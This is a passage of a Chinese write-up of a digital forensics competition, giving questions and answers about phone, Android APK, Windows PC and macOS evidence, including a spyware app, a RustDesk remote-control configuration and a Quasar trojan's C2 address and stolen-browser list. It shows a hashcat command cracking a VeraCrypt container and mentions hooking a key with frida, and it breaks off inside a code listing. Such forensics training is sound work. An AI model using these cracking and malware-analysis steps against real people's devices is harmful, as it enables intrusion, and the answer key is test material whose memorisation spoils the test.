title="5"></a>5</h3><p><strong>机主hotmail邮箱地址是？</strong></p><p>telegram聊天记录中有提到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747144721011-e8536ab7-3e6d-4d1e-8646-5f6a181b7db9.png" alt="img"></p><p><a href="mailto:&#x68;&#111;&#115;&#x74;&#x73;&#105;&#120;&#101;&#114;&#64;&#104;&#111;&#x74;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#x68;&#111;&#115;&#x74;&#x73;&#105;&#120;&#101;&#114;&#64;&#104;&#111;&#x74;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><strong>苹果电脑开机密码是？</strong></p><p>在手机截屏里</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747144951825-4a46e6b4-c115-431d-85a8-9950f4caa0e1.png" alt="img"></p><p>12345678</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><p><strong>Telegram加密通讯中，加密聊天信息用到的第二个解密载体是？</strong></p><p>在mac的备忘录中找到《蜜语规则》</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747145375083-c7085502-b04a-41a3-a8e3-2fe3bea2f801.png" alt="img"></p><p>2.mp4</p><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><p><strong>贾韦码的内部代号是？</strong></p><p>在苹果手机的office文件中找到聊天话术V2.docx，其中有提到被害者代号</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747145781497-9cc21e4e-5b54-4b96-8924-ee3baea15503.png" alt="img"></p><p>48</p><h3 id="9"><a href="#9" class="headerlink" title="9"></a>9</h3><p><strong>特快专递的收货地址是？</strong></p><p>还是在上一题的文档中有提到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747145907155-94225710-42fb-4763-a5a6-9d456988f548.png" alt="img"></p><p>西红市中山路35号PGS健身房</p><h2 id="APK取证"><a href="#APK取证" class="headerlink" title="APK取证"></a>APK取证</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><strong>分析安卓检材，远控工具包名是？</strong></p><p>可以看到QQ聊天记录中传了一个apk文件</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747147039168-67b4b0a2-6e04-4522-ad75-699afd0cce0a.png" alt="img"></p><p>用jadx看一下可以确定这个apk就是手机中已经安装的rustdesk</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747147090731-a98bf2e8-b2c9-422a-a07f-1837981354ee.png" alt="img"></p><p>com.carriez.flutter_hbb</p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><strong>远控工具中继服务器IP是？</strong></p><p>直接去配置文件里面翻就能找到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747150578925-6ae9fb3d-2ed4-473e-8db0-21111b3430a8.png" alt="img"></p><p>59.110.10.229</p><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p><strong>远控工具ID服务器端口是？</strong></p><p>由上题可知</p><p>21116</p><h3 id="4-1"><a href="#4-1" class="headerlink" title="4"></a>4</h3><p><strong>远控工具中继服务器Key是？</strong></p><p>由上题可知</p><p>WIUqzRq1Ocx4QNnsF26dZQijKdyd2L9OfaT55hDlQCI&#x3D;</p><h3 id="5-1"><a href="#5-1" class="headerlink" title="5"></a>5</h3><p><strong>远控工具中收藏的远程ID是？</strong></p><p>仍可以翻配置文件找到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747150872456-3b96eadc-874d-4c6c-9238-c661d2931421.png" alt="img"></p><p>1807892422</p><h3 id="6-1"><a href="#6-1" class="headerlink" title="6"></a>6</h3><p><strong>远程控制该手机的手机型号是？</strong></p><p>翻配置文件</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747150964079-94af8843-33be-4b18-b17f-fda30fa0ced9.png" alt="img"></p><p>google-Pixel</p><h3 id="7-1"><a href="#7-1" class="headerlink" title="7"></a>7</h3><p><strong>监听工具包名是？</strong></p><p>在apk列表中可以找到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747151179608-e525a5cd-acdd-4151-9b65-ce2b467ac24a.png" alt="img"></p><p>com.example.liekai</p><h3 id="8-1"><a href="#8-1" class="headerlink" title="8"></a>8</h3><p><strong>监听工具代码主入口是？</strong></p><p>用jadx看一下这个apk</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747151350750-701578d3-3ec9-4e97-82d0-fe792cb9129c.png" alt="img"></p><p>com.example.liekai.MainActivity</p><h3 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h3><p><strong>监听工具的签名算法是？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747151475974-89ed64ad-acfd-4fa3-aa08-d2c108093dd3.png" alt="img"></p><p>SHA256RSA</p><h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p><strong>监听工具运行多少秒后会跳转成黑色幕布？</strong></p><p>可以把逆向出来的代码丢给ds</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747226953032-31c8ca22-4610-4b62-bec3-9ff1ce10b17e.png" alt="img"></p><p>1.000</p><h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p><strong>监听工具运行后，黑色幕布上字符串是？</strong></p><p>用安卓开发者助手可以看到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747212549756-0c373caf-54f3-4ef7-9e35-84a9c83456fe.png" alt="img"></p><p>pgs比武专用</p><h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p><strong>监听工具检测到多少分贝开始录音？</strong></p><p>在程序的开头有这样一个页面</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747210026517-8ebbe542-b7bd-4f10-96ab-f5c8b70583c6.png" alt="img"></p><p>70</p><h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p><strong>监听工具录音连续几秒没有检测到声音停止录音？</strong></p><p>由上题</p><p>4</p><h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p><strong>监听工具保存文件存储路径的数据库名称是？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747215414525-6a42433e-35f5-425d-8e4b-709e106126fd.png" alt="img"></p><p>recordings.db</p><h3 id="15"><a href="#15" class="headerlink" title="15"></a>15</h3><p><strong>监听工具保存录像文件的文件夹是？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747215263195-4dc0e1c2-24f2-4d35-aa7b-a247b42e6705.png" alt="img"></p><p>recording</p><h3 id="16"><a href="#16" class="headerlink" title="16"></a>16</h3><p><strong>监听工具数据库中保存音视频文件的路径使用什么加密？</strong></p><p>ds 逆向一下 encryption_utils.dart</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747580187409-7b029cdc-97b4-4026-b420-e32595344b92.png" alt="img"></p><p>Salsa20</p><h3 id="17"><a href="#17" class="headerlink" title="17"></a>17</h3><p><strong>录音的文件采用什么加密方式？</strong></p><p>由上题，密钥长度是32个字节，256bits</p><p>AES-256</p><h3 id="18"><a href="#18" class="headerlink" title="18"></a>18</h3><p><strong>录像文件加密秘钥的最后一位是？</strong></p><p>ds 给出静态的key数据，但是明显有点问题</p><p>比如这个 454 显然不属于 uint8 </p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747580591634-e44df25c-817d-4e24-847d-c73181dc0583.png" alt="img"></p><p>用 frida hook 能拿到真正的加密密钥，转一下hex</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747580968961-7406fd13-16c8-4173-bb69-bd76cd411cb7.png" alt="img"></p><p>0x4D</p><h3 id="19"><a href="#19" class="headerlink" title="19*"></a>19*</h3><p>*<em>原始文件md5为3b4d*</em>*<em>55ae的创建时间是？</em>*</p><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><strong>分析贾韦码计算机检材，计算机系统Build版本为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747228908061-7e5a6780-c986-46bf-a72d-bfd4e92786df.png" alt="img"></p><p>18362</p><h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><strong>计算机最后一次正常关机的时间为？UTC +0</strong></p><p>要求UTC+0 !!!</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229072376-ba829d46-5b63-450c-b7d5-f7feb4e0d3db.png" alt="img"></p><p>2025-04-18 03:20:54</p><h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><strong>计算机网卡的MAC地址为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229196965-00c266d1-1a26-4062-a2a2-ded687cd64cf.png" alt="img"></p><p>00-0C-29-0F-69-00</p><h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><p><strong>计算机用户“贾韦码” 安全标识符SID为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229272923-e717427e-ca5e-4a31-a1cd-112dd1a58968.png" alt="img"></p><p>S-1-5-21-3733482367-3411043098-2536183883-1001</p><h3 id="5-2"><a href="#5-2" class="headerlink" title="5"></a>5</h3><p><strong>计算机默认浏览器为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229355440-18269185-c84a-4d33-9290-9c7ad74f91e6.png" alt="img"></p><p>Google Chrome</p><h3 id="6-2"><a href="#6-2" class="headerlink" title="6"></a>6</h3><p><strong>计算机默认浏览器版本为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229716493-11b68db7-bd89-44f3-975f-cf35bdda4954.png" alt="img"></p><p>135.0.7049.96</p><h3 id="7-2"><a href="#7-2" class="headerlink" title="7"></a>7</h3><p><strong>机主通过浏览器搜索国外社交软件为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229812714-042207a6-82a8-4abd-9ec9-7e4f0bb6c16a.png" alt="img"></p><p>Telegram</p><h3 id="8-2"><a href="#8-2" class="headerlink" title="8"></a>8</h3><p><strong>机主的邮箱账号为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229908609-94f06860-e52a-4015-94d4-2e909e2d68d0.png" alt="img"></p><p><a href="mailto:&#x74;&#x71;&#x6d;&#x64;&#x61;&#118;&#105;&#100;&#x6a;&#111;&#x68;&#110;&#115;&#111;&#x6e;&#51;&#48;&#x30;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#x74;&#x71;&#x6d;&#x64;&#x61;&#118;&#105;&#100;&#x6a;&#111;&#x68;&#110;&#115;&#111;&#x6e;&#51;&#48;&#x30;&#64;&#103;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></p><h3 id="9-2"><a href="#9-2" class="headerlink" title="9"></a>9</h3><p><strong>计算机装过一款反取证软件为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747229987576-68e532c5-9bff-4fc3-9f45-60c0898a4cab.png" alt="img"></p><p>VeraCrypt.exe</p><h3 id="10-1"><a href="#10-1" class="headerlink" title="10"></a>10</h3><p><strong>计算机通过Xshell远程连接的ip地址为？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747230049925-0533c773-b719-4e83-bd6f-eeb2d9fc323a.png" alt="img"></p><p>192.168.56.129</p><h3 id="11-1"><a href="#11-1" class="headerlink" title="11"></a>11</h3><p><strong>机主曾买过一个美国的TG账号，请给该账号的原两步验证密码？</strong></p><p>邮件中有提到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747230136956-13042a94-faef-4d91-9dbf-a24995a283dd.png" alt="img"></p><p>13770603</p><h3 id="12-1"><a href="#12-1" class="headerlink" title="12"></a>12</h3><p><strong>给出其电脑内加密容器的解密密码？</strong></p><p>进入VR场景，在受害人家卧室的衣柜里发现有一个暗门</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747230234897-b47f6363-b4cd-4326-a2be-bae0df549d2d.png" alt="img"></p><p>进入后桌上放着一张纸条，上面有密码</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747230269207-ab33baba-61da-4812-867e-1a92f680b7d5.png" alt="img"></p><p>在pc的图片文件夹中找到加密容器</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747230478139-35ba64d2-ed1a-4ea3-9799-1d233628c4d8.png" alt="img"></p><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13721 -a 3 dsf2wecasdcqwed12434 Pgs?d?d?d?dd3j</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747234206476-5ac0509e-d4d9-4f0d-9f3f-a18db7be57bc.png" alt="img"></p><p>Pgs8521d3j</p><h3 id="13-1"><a href="#13-1" class="headerlink" title="13"></a>13</h3><p><strong>给出其电脑内加密容器挂载的盘符？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747238362680-6783aac7-3e96-4691-9d56-559a5b5f25e8.png" alt="img"></p><p>F</p><h3 id="14-1"><a href="#14-1" class="headerlink" title="14"></a>14</h3><p><strong>给出其电脑内存放了多少张伪造身份证？</strong></p><p>挂载得到的容器，里面都是伪造身份证</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747239021207-b7ce49cf-f824-404e-af3b-76ba0bfc1522.png" alt="img"></p><p>1023</p><h3 id="15-1"><a href="#15-1" class="headerlink" title="15"></a>15</h3><p><strong>找出任敏的身份证编号？</strong></p><p>3.jpg就是要找的</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747239116031-4a4afc74-d4ce-4d0a-bf5e-6aab3372c530.png" alt="img"></p><p>430529195112085460</p><h3 id="16-1"><a href="#16-1" class="headerlink" title="16"></a>16</h3><p><strong>找出其电脑内存放的密钥文件，计算其MD5?</strong></p><p>可以看到曾查看过一个可疑文件</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747411208296-4c1ca7cc-9e72-44f5-9172-5cc895b9bb7c.png" alt="img"></p><p>然而这个文件已经被删除了，但是我们仍可以在未使用空间中找到它</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747411385879-4c6584fe-ee91-4637-9c50-149d2cbe0415.png" alt="img"></p><p>提取出来计算md5</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747411600922-6ac05307-fdc3-45b3-88ec-4dca3261fc94.png" alt="img"></p><p>1022cc083a4a5a9e2036065e2822c48e</p><h3 id="17-1"><a href="#17-1" class="headerlink" title="17"></a>17</h3><p><strong>找出其电脑内存放的密钥文件，解密此密钥文件，给出其内容？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747411694516-5f21338f-c596-4cef-ba90-d8d6af0f1db2.png" alt="img"></p><p>zfs加密pool密钥文件</p><h3 id="18-1"><a href="#18-1" class="headerlink" title="18"></a>18</h3><p><strong>对macOS系统进行解析，登陆的电子邮件服务是谁提供的？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747326414891-9dbfa459-e14c-4bfe-8fe8-e088448d8114.png" alt="img"></p><p>microsoft</p><h3 id="19-1"><a href="#19-1" class="headerlink" title="19"></a>19</h3><p><strong>系统备忘录的包名是什么？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747326508781-354ebd41-5435-4dd9-89e7-93894951e64a.png" alt="img"></p><p>com.apple.Notes</p><h3 id="20"><a href="#20" class="headerlink" title="20"></a>20</h3><p><strong>图片中隐藏的内容是什么？</strong></p><p>图片指的是之前看到的蜜语规则中的3.png</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747326698002-26210cac-12a9-4b43-a780-0209033dd855.png" alt="img"></p><p>在red plane中可以看到一张二维码</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747326772278-b48d2037-8cf4-425b-bae8-79c07bccd1d3.png" alt="img"></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747326838268-c3d65c0f-b721-418e-99ce-735005769898.png" alt="img"></p><p>位移加密 正向位移操作</p><h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><p><strong>被加密文件的扩展名是什么？</strong></p><p>在桌面上找到被加密的文件，可以看到后缀名是enc</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747327164325-3796ff4f-3f56-44ed-b687-d683db0eaf3e.png" alt="img"></p><p>enc</p><h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><p><strong>被加密的文件总共有几个？</strong></p><p>由上题</p><p>1</p><h3 id="23"><a href="#23" class="headerlink" title="23"></a>23</h3><p><strong>贾韦码家使用的智能门锁品牌型号是什么？</strong></p><p>由苹果应用取证部分可看到加密逻辑其实就是个AES</p><p>key直接运行原程序输出即可，IV是密文的前16字节</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747414501156-b546cea6-36e7-4f3f-93b3-27f0040b18be.png" alt="img"></p><p>解压后是face1.jpg和资料.docx</p><p>阅读文档得知</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747414632517-b3ccb973-dedb-412d-ad2a-51e1fd78a82b.png" alt="img"></p><p>金刚Ⅲ号</p><h2 id="EXE取证"><a href="#EXE取证" class="headerlink" title="EXE取证"></a>EXE取证</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><strong>分析Windows木马，其控制端ip是？</strong></p><p>在pc的documents里可以找到一个exe文件</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747327472273-6c77212d-7dc3-419b-850e-db39e665c09a.png" alt="img"></p><p>丢进云沙箱分析</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747327600501-145ef66d-5bfc-42e1-95a5-e507def67c4c.png" alt="img"></p><p>104.18.45.79</p><h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><strong>软件会复制自身到哪个文件夹下？</strong></p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747327712580-8cfacd22-b91e-4b80-a7e1-5ac3d0b28ea5.png" alt="img"></p><p>SubDir</p><h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><p><strong>接上题，复制后软件名称是？</strong></p><p>由上题</p><p>BwAcr.exe</p><h3 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h3><p><strong>软件一共可以窃取多少种浏览器的信息？</strong></p><p>用dnspy逆向上面的程序，可以看到这么几个函数的调用</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747328637460-6d31edb4-7b30-49e1-b5a5-b2edebed54fe.png" alt="img"></p><p>经过依次点进去查看后，可以确定是有Brave, Google, Opera, OperaGX, Edge, Yandex, FireFox, IE</p><p>8</p><h3 id="5-3"><a href="#5-3" class="headerlink" title="5"></a>5</h3><p><strong>软件查询安装的杀毒软件出错或异常会返回什么字符串？</strong></p><p>前面通过云沙箱可以得知这个程序是Quasar木马家族的，可以直接去github上面找到</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747329228878-e6392864-365a-4710-9622-aa649d0671cb.png" alt="img"></p><p>Unknown</p><h2 id="苹果应用取证"><a href="#苹果应用取证" class="headerlink" title="苹果应用取证"></a>苹果应用取证</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><strong>对mac电脑中的加密程序进行分析，使用了一个特定的数作为密钥生成的种子，请问这个数是什么？</strong></p><p>在MAC的桌面上找到文件加密器</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747408841216-e1b9ad4d-46e7-4b7e-baa1-028d809b74b6.png" alt="img"></p><p>gui_wrapper.py中专门对一个模块的引入是否成功进行了检测</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747408811081-e6ede238-4ab6-411f-bae0-8782b55f7b76.png" alt="img"></p><p>将这个模块提取出来逆向</p><p><img src="/images/%E7%9B%98%E5%8F%A4%E7%9F%B3%E6%9D%AF2025%E5%88%9D%E8%B5%9B-Writeup-%E5%A4%8D%E7%8E%B0/1747408290680-0285be66-44a1-4b5a-be42-1fdace3feb0d.png" alt="img"></p><p>用<a href="https://pylingual.io/">pylingual</a>反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span 